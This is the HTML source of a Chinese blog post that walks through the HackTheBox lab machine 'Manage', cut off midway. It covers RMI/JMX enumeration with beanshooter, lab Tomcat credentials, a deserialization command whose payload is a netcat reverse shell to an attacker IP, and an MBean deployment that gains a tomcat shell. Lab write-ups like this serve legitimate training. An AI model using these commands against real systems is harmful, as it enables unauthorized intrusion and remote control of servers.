@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- Google Fonts -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=LXGW+WenKai+Mono+TC:normal,bold,italic">
+    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Inconsolata:normal,bold">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Nmap123456789101112131415">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox——HTB Manage Writeup">
+<meta property="og:url" content="https://n0nome.github.io/2025/07/30/Manage/Manage/index.html">
+<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
+<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Nmap123456789101112131415">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0nome.github.io/images/Manage-9.png">
+<meta property="og:image" content="https://n0nome.github.io/images/Manage.png">
+<meta property="og:image" content="https://n0nome.github.io/images/Manage-1.png">
+<meta property="og:image" content="https://n0nome.github.io/images/Manage-2.png">
+<meta property="og:image" content="https://n0nome.github.io/images/Manage-3.png">
+<meta property="og:image" content="https://n0nome.github.io/images/Manage-4.png">
+<meta property="og:image" content="https://n0nome.github.io/images/Manage-5.png">
+<meta property="og:image" content="https://n0nome.github.io/images/Manage-6.png">
+<meta property="og:image" content="https://n0nome.github.io/images/Manage-7.png">
+<meta property="og:image" content="https://n0nome.github.io/images/Manage-8.png">
+<meta property="article:published_time" content="2025-07-30T14:33:44.375Z">
+<meta property="article:modified_time" content="2025-07-30T14:33:44.515Z">
+<meta property="article:author" content="n0nome">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0nome.github.io/images/Manage-9.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/laojun.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/laojun.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/laojun.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox——HTB Manage Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RXS95XH60B"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-RXS95XH60B');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/07/30/Era/Era/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/07/30/Manage/Manage/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&text=HackTheBox——HTB Manage Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&title=HackTheBox——HTB Manage Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&is_video=false&description=HackTheBox——HTB Manage Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Manage Writeup&body=Check out this article: https://n0nome.github.io/2025/07/30/Manage/Manage/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&title=HackTheBox——HTB Manage Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&title=HackTheBox——HTB Manage Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&title=HackTheBox——HTB Manage Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&title=HackTheBox——HTB Manage Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/07/30/Manage/Manage/&name=HackTheBox——HTB Manage Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/07/30/Manage/Manage/&t=HackTheBox——HTB Manage Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    
+
+    
+      <!-- 如果文章被加密，初始隐藏目录 -->
+      <div id="toc" style="">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8080"><span class="toc-number">1.1.</span> <span class="toc-text">8080</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Rmi-exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Java Rmi exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Tomcat"><span class="toc-number">2.</span> <span class="toc-text">Shell As Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Backups-Documents-Got-Id-rsa-And-Google-auth-code"><span class="toc-number">2.1.</span> <span class="toc-text">Backups Documents Got Id_rsa And Google_auth code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Useradmin"><span class="toc-number">3.</span> <span class="toc-text">Shell As Useradmin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu-Default-Sudoers-Admin-Group-Add"><span class="toc-number">3.1.</span> <span class="toc-text">Ubuntu Default Sudoers Admin Group Add</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Root"><span class="toc-number">4.</span> <span class="toc-text">Shell As Root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">4.1.</span> <span class="toc-text">Hashes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudoers"><span class="toc-number">4.2.</span> <span class="toc-text">Sudoers</span></a></li></ol></li></ol>
+      </div>
+     
+ </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox——HTB Manage Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">n0nome</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-07-30T14:33:44.375Z" class="dt-published" itemprop="datePublished">2025-07-30</time>
+        
+        (Updated: <time datetime="2025-07-30T14:33:44.515Z" class="dt-updated" itemprop="dateModified">2025-07-30</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
+<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><a data-fancybox="gallery" data-src="/images/Manage-9.png" data-caption=""><img src="/images/Manage-9.png"></a></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE    REASON         VERSION</span><br><span class="line">22/tcp    open  ssh        syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/6LNCGTwX42XmhwON6uF7gkwKfdO4iIzYnFD87dWpXiPrNIYgfW0953r40u4j4DAf+PhgdmdKKKE8KIifQaVc=</span><br><span class="line">|   256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbGFCw+4cyYAXrdHnPXp2K1ojZhTcQrXPI+pDFW5vkh</span><br><span class="line">53/tcp    open  domain     syn-ack ttl 63 dnsmasq 2.51</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: dnsmasq-2.51</span><br><span class="line">2222/tcp  open  java-rmi   syn-ack ttl 62 Java RMI</span><br><span class="line">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| rmi-dumpregistry: </span><br><span class="line">|   jmxrmi</span><br><span class="line">|     javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class="line">|     @127.0.1.1:43641</span><br><span class="line">|     extends</span><br><span class="line">|       java.rmi.server.RemoteStub</span><br><span class="line">|       extends</span><br><span class="line">|_        java.rmi.server.RemoteObject</span><br><span class="line">8080/tcp  open  http       syn-ack ttl 62 Apache Tomcat 10.1.19</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Apache Tomcat/10.1.19</span><br><span class="line">40309/tcp open  tcpwrapped syn-ack ttl 62</span><br><span class="line">43641/tcp open  java-rmi   syn-ack ttl 62 Java RMI</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<h3 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h3><p>8080端口是tomcat的安装成功界面<br><a data-fancybox="gallery" data-src="/images/Manage.png" data-caption=""><img src="/images/Manage.png"></a></p>
+<p><a data-fancybox="gallery" data-src="/images/Manage-1.png" data-caption=""><img src="/images/Manage-1.png"></a></p>
+<p>这里mm枚举一下目录看看</p>
+<h3 id="Java-Rmi-exploit"><a href="#Java-Rmi-exploit" class="headerlink" title="Java Rmi exploit"></a>Java Rmi exploit</h3><p>这里看到还开了两个rmi的口，google找一下枚举的工具<br>可以看到一个<a target="_blank" rel="noopener" href="https://github.com/qtc-de/remote-method-guesser">remote-method-guesser</a>，此事在<a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/en/network-services-pentesting/1099-pentesting-java-rmi.html?highlight=RMI#rmi-enumeration">HackTricks</a>也有记载</p>
+<p>安装一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ git <span class="built_in">clone</span> https://github.com/qtc-de/remote-method-guesser                                                             </span><br><span class="line"><span class="built_in">cd</span> remote-method-guesser                                                                                                  </span><br><span class="line">mvn package        </span><br></pre></td></tr></table></figure>
+
+<p>枚举一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">└─$ java -jar remote-method-guesser/target/rmg-5.1.0-jar-with-dependencies.jar enum <span class="variable">$IP</span> 2222</span><br><span class="line">[+] RMI registry bound names:</span><br><span class="line">[+]</span><br><span class="line">[+]     - jmxrmi</span><br><span class="line">[+]             --&gt; javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)</span><br><span class="line">[+]                 Endpoint: 127.0.1.1:43641  CSF: RMISocketFactory  ObjID: [-41c5c60d:19858c938d8:-7fff, -8802940917853979532]</span><br><span class="line">[+]</span><br><span class="line">[+] RMI server codebase enumeration:</span><br><span class="line">[+]</span><br><span class="line">[+]     - The remote server does not expose any codebases.</span><br><span class="line">[+]</span><br><span class="line">[+] RMI server String unmarshalling enumeration:</span><br><span class="line">[+]</span><br><span class="line">[+]     - Server complained that object cannot be casted to java.lang.String.</span><br><span class="line">[+]       --&gt; The <span class="built_in">type</span> java.lang.String is unmarshalled via readString().</span><br><span class="line">[+]       Configuration Status: Current Default</span><br><span class="line">[+]</span><br><span class="line">[+] RMI server useCodebaseOnly enumeration:</span><br><span class="line">[+]</span><br><span class="line">[+]     - RMI registry uses readString() <span class="keyword">for</span> unmarshalling java.lang.String.</span><br><span class="line">[+]       This prevents useCodebaseOnly enumeration from remote.</span><br><span class="line">[+]</span><br><span class="line">[+] RMI registry localhost bypass enumeration (CVE-2019-2684):</span><br><span class="line">[+]</span><br><span class="line">[+]     - Registry rejected unbind call cause it was not sent from localhost.</span><br><span class="line">[+]       Vulnerability Status: Non Vulnerable</span><br><span class="line">[+]</span><br><span class="line">[+] RMI Security Manager enumeration:</span><br><span class="line">[+]</span><br><span class="line">[+]     - Caught Exception containing <span class="string">&#x27;no security manager&#x27;</span> during RMI call.</span><br><span class="line">[+]       --&gt; The server does not use a Security Manager.</span><br><span class="line">[+]       Configuration Status: Current Default</span><br><span class="line">[+]</span><br><span class="line">[+] RMI server JEP290 enumeration:</span><br><span class="line">[+]</span><br><span class="line">[+]     - DGC rejected deserialization of java.util.HashMap (JEP290 is installed).</span><br><span class="line">[+]       Vulnerability Status: Non Vulnerable</span><br><span class="line">[+]</span><br><span class="line">[+] RMI registry JEP290 bypass enumeration:</span><br><span class="line">[+]</span><br><span class="line">[+]     - RMI registry uses readString() <span class="keyword">for</span> unmarshalling java.lang.String.</span><br><span class="line">[+]       This prevents JEP 290 bypass enumeration from remote.</span><br><span class="line">[+]</span><br><span class="line">[+] RMI ActivationSystem enumeration:</span><br><span class="line">[+]</span><br><span class="line">[+]     - Caught NoSuchObjectException during activate call (activator not present).</span><br><span class="line">[+]       Configuration Status: Current Default</span><br></pre></td></tr></table></figure>
+
+<p>使用其他的cc参数没发现什么问题，上面有个jmx server，继续google</p>
+<p><a data-fancybox="gallery" data-src="/images/Manage-2.png" data-caption=""><img src="/images/Manage-2.png"></a></p>
+<p>有一个<a target="_blank" rel="noopener" href="https://github.com/qtc-de/beanshooter">beanshooter</a>的工具，下载一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">└─$ java -jar beanshooter/target/beanshooter-4.1.0-jar-with-dependencies.jar enum <span class="variable">$IP</span> 2222                                </span><br><span class="line">[+] Checking available bound names:                                                                                       </span><br><span class="line">[+]                                                                                                                       </span><br><span class="line">[+]     * jmxrmi (JMX endpoint: 127.0.1.1:43641)                                                                          </span><br><span class="line">[+]                                                                                                                       </span><br><span class="line">[+] Checking <span class="keyword">for</span> unauthorized access:                                                                                     </span><br><span class="line">[+]                                                                                                                       </span><br><span class="line">[+]     - Remote MBean server does not require authentication.                                                            </span><br><span class="line">[+]       Vulnerability Status: Vulnerable                                                                                </span><br><span class="line">[+]                                                                                                                       </span><br><span class="line">[+] Checking pre-auth deserialization behavior:                                                                           </span><br><span class="line">[+]                                                                                                                       </span><br><span class="line">[+]     - Remote MBeanServer rejected the payload class.                                                                  </span><br><span class="line">[+]       Vulnerability Status: Non Vulnerable                                                                            </span><br><span class="line">[+]                                                                                                                       </span><br><span class="line">[+] Checking available MBeans:                                                                                            </span><br><span class="line">[+]                                                                                                                       </span><br><span class="line">[+]     - 203 MBeans are currently registred on the MBean server.                                                         </span><br><span class="line">[+]       Listing 181 non default MBeans:                                       </span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[+]       - com.sun.management.internal.DiagnosticCommandImpl (com.sun.management:<span class="built_in">type</span>=DiagnosticCommand) (action: diagnostic)</span><br><span class="line">[+]</span><br><span class="line">[+] Enumerating tomcat <span class="built_in">users</span>:</span><br><span class="line">[+]</span><br><span class="line">[+]     - Listing 2 tomcat <span class="built_in">users</span>:</span><br><span class="line">[+]</span><br><span class="line">[+]             ----------------------------------------</span><br><span class="line">[+]             Username:  manager</span><br><span class="line">[+]             Password:  fhErvo2r9wuTEYiYgt</span><br><span class="line">[+]             Roles:</span><br><span class="line">[+]                        Users:<span class="built_in">type</span>=Role,rolename=<span class="string">&quot;manage-gui&quot;</span>,database=UserDatabase</span><br><span class="line">[+]</span><br><span class="line">[+]             ----------------------------------------</span><br><span class="line">[+]             Username:  admin</span><br><span class="line">[+]             Password:  onyRPCkaG4iX72BrRtKgbszd</span><br><span class="line">[+]             Roles:</span><br><span class="line">[+]                        Users:<span class="built_in">type</span>=Role,rolename=<span class="string">&quot;role1&quot;</span>,database=UserDatabase</span><br></pre></td></tr></table></figure>
+
+<p>出货了，但是这个是<code>tomcat</code>的，试一下ssh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ ssh manage@<span class="variable">$IP</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.129.234.57 (10.129.234.57)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:mTJofQVp4T/1uO1CFsfPt8SADZfjbzIIynR0Zeqi0qo.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.129.234.57<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">manage@10.129.234.57: Permission denied (publickey).</span></span><br></pre></td></tr></table></figure>
+
+<p>不行诶，翻一下他的文档可以看到很多get shell的方式</p>
+<p><a data-fancybox="gallery" data-src="/images/Manage-3.png" data-caption=""><img src="/images/Manage-3.png"></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ java -jar beanshooter/target/beanshooter-4.1.0-jar-with-dependencies.jar serial <span class="variable">$IP</span> 2222 CommonsCollections6 <span class="string">&quot;nc 10.10.16.178 9001 -e shsh&quot;</span> --username manage --password fhErvo2r9wuTEYiYgt </span><br><span class="line">[+] Attemting deserialization attack on JMX endpoint.</span><br><span class="line">[+]</span><br><span class="line">[-]     Unable to find ysoserial library <span class="keyword">in</span> path /opt/yso.jar</span><br><span class="line">[-]     Check your configuration file or use the --yso <span class="built_in">command</span> line parameter.</span><br><span class="line">[-]     Cannot <span class="built_in">continue</span> from here.</span><br></pre></td></tr></table></figure>
+
+<p>哈哈哈，因为没有<code>yso.jar</code>而断绝黑客路</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ java -jar beanshooter/target/beanshooter-4.1.0-jar-with-dependencies.jar standard <span class="variable">$IP</span> 2222 tonka         </span><br><span class="line">[+] Creating a TemplateImpl payload object to abuse StandardMBean</span><br><span class="line">[+]</span><br><span class="line">[+]     Deplyoing MBean: StandardMBean</span><br><span class="line">[+]     MBean with object name de.qtc.beanshooter:standard=8605124731129 was successfully deployed.</span><br><span class="line">[+]</span><br><span class="line">[+]     Caught NullPointerException <span class="keyword">while</span> invoking the newTransformer action.</span><br><span class="line">[+]     This is expected bahavior and the attack most likely worked :)</span><br><span class="line">[+]</span><br><span class="line">[+]     Removing MBean with ObjectName de.qtc.beanshooter:standard=8605124731129 from the MBeanServer.</span><br><span class="line">[+]     MBean was successfully removed.</span><br><span class="line"></span><br><span class="line">└─$ java -jar beanshooter/target/beanshooter-4.1.0-jar-with-dependencies.jar tonka shell <span class="variable">$IP</span> 2222     </span><br><span class="line">[tomcat@10.129.234.57 /]$ <span class="built_in">id</span></span><br><span class="line">uid=1001(tomcat) gid=1001(tomcat) <span class="built_in">groups</span>=1001(tomcat)</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/images/Manage-4.png" data-caption=""><img src="/images/Manage-4.png"></a></p>
+<h2 id="Shell-As-Tomcat"><a href="#Shell-As-Tomcat" class="headerlink" title="Shell As Tomcat"></a>Shell As Tomcat</h2><p>如果<code>cd ~</code>的话会报错，这个用户没有家目录，但是在<code>/opt/tomcat</code>里面找到了<code>user.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[tomcat@10.129.234.57 /home]$ find / -<span class="built_in">type</span> f -name <span class="string">&quot;user.txt&quot;</span> 2&gt;/dev/null</span><br><span class="line">/opt/tomcat/user.txt</span><br></pre></td></tr></table></figure>
+
+<p>传一个linpeas看一下吧</p>
+<h3 id="Backups-Documents-Got-Id-rsa-And-Google-auth-code"><a href="#Backups-Documents-Got-Id-rsa-And-Google-auth-code" class="headerlink" title="Backups Documents Got Id_rsa And Google_auth code"></a>Backups Documents Got Id_rsa And Google_auth code</h3><p>一上linpeas就上当了，这枚举在aws那就给卡住了<br>还是手动枚举一下吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[tomcat@10.129.234.57 /home/karl]$ <span class="built_in">ls</span> -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 5 karl karl 4096 Apr 14 07:26 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Jun 21  2024 ..</span><br><span class="line">lrwxrwxrwx 1 karl karl    9 Jun 21  2024 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 karl karl  220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 karl karl 3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 karl karl 4096 Mar  1  2024 .cache</span><br><span class="line">drwxrwxr-x 3 karl karl 4096 Apr 14 07:26 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r-- 1 karl karl  807 Jan  6  2022 .profile</span><br><span class="line">drwx------ 2 karl karl 4096 Apr 14 07:24 .ssh</span><br><span class="line">-rw-r--r-- 1 karl karl    0 Mar  1  2024 .sudo_as_admin_successful</span><br><span class="line"></span><br><span class="line">[tomcat@10.129.234.57 /home/useradmin]$ <span class="built_in">ls</span> -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 5 useradmin useradmin 4096 Jun 26 09:58 .</span><br><span class="line">drwxr-xr-x 4 root      root      4096 Jun 21  2024 ..</span><br><span class="line">drwxrwxr-x 2 useradmin useradmin 4096 